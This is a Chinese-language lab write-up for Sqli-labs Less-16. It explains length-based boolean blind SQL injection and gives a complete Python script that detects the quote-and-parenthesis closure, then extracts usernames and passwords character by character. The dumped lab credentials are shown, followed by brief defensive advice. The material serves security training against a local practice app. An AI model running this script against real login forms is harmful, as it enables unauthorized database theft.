## 题目: Sqli-labs Less-16

## 题目描述
本关是一个登录框页面，标题为 `Blind - Boolian Based - String with quotes`。
与 Less-15 类似，页面无论是登录成功还是失败，都不会显示 `You are in` 或具体的 SQL 报错信息，这让传统的基于文本内容的盲注完全失效。

## 解题思路
既然页面的文字没有任何变化，我们依然沿用 Less-15 的**“页面长度对比法”**：
1. 先发一个正常失败的请求，记录基准长度。
2. 自动尝试各种可能的闭合符（本关的闭合符是 `")`），如果注入 `and 1=1` 后页面长度发生改变，则说明闭合符正确。
3. 使用二分法进行爆破，判断条件为：`len(response.text) != base_len`。

## 解题步骤

**1. 测试闭合符（⚠️ 踩坑记录）**
* **实战操作**：一开始沿用之前的思路，在脚本里写了各种常规的闭合符（如 `'`、`"`、`')`）。
* **踩坑**：脚本探测失败。因为本关的闭合符是 **`")`**（双引号加括号），如果闭合符不对，后面的 `and 1=1` 就无法生效，页面长度自然也不会发生变化。
* **破局**：在脚本的 `prefixes` 列表中加入 `admin")`，让其自动探测，成功找到正确的闭合符。

**2. 编写基于长度的布尔盲注脚本**

**实战 Payload 核心代码**：

```python
import requests

url = "http://127.0.0.1/sqli-labs/Less-16/"
query = "(select group_concat(username,0x3a,password) from users)"
result = ""

# 记录正常失败页面的长度作为基准
base_data = {'uname': 'admin', 'passwd': '1', 'submit': 'Submit'}
r_base = requests.post(url, data=base_data)
base_len = len(r_base.text)

# 准备所有可能的闭合符（包含本关的 admin")）
prefixes = ["admin')", 'admin")', "admin'", 'admin"']
valid_prefix = None

print("正在自动探测正确的闭合符...")
# 1. 基于长度变化探测闭合符
for p in prefixes:
    payload = p + " and 1=1 #"
    data = {'uname': payload, 'passwd': '1', 'submit': 'Submit'}
    r = requests.post(url, data=data)
    if len(r.text) != base_len:
        print(f"[+] 找到正确的闭合符: {p}")
        valid_prefix = p
        break

# 2. 布尔盲注爆破
if valid_prefix:
    print("开始爆破数据...")
    for i in range(1, 100):
        low, high = 32, 127
        while low <= high:
            mid = (low + high) // 2
            payload = f'{valid_prefix} and ascii(substr({query},{i},1))>{mid} #'
            data = {'uname': payload, 'passwd': '1', 'submit': 'Submit'}
            r = requests.post(url, data=data)
            
            # 核心判断：如果长度变了，说明条件成立
            if len(r.text) != base_len:
                low = mid + 1
            else:
                high = mid - 1
                
        if low == 32 or low == 0 or low == 127:
            break
        result += chr(low)
        print(f"[+] 当前结果: {result}")
else:
    print("[-] 探测失败，请检查网络或环境。")
```

**3. 运行结果**
成功爆出全部账号密码数据：

```text
Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman...
```
## 知识点总结
* 盲注的多样性：当页面内容（文字）没有差异时，可以尝试观察 HTTP 状态码（200 vs 302）、响应时间（时间盲注）、或者页面长度（布尔盲注）。
* 闭合符的灵活探测：Less-16 的闭合符是 ")，这说明前端开发人员在写代码时，往往会在变量外套上双引号和括号。我们在写脚本时，必须穷举常见的闭合符。
* 防御策略：使用 PDO 预编译；统一错误页面的返回内容；关闭生产环境的详细报错回显。
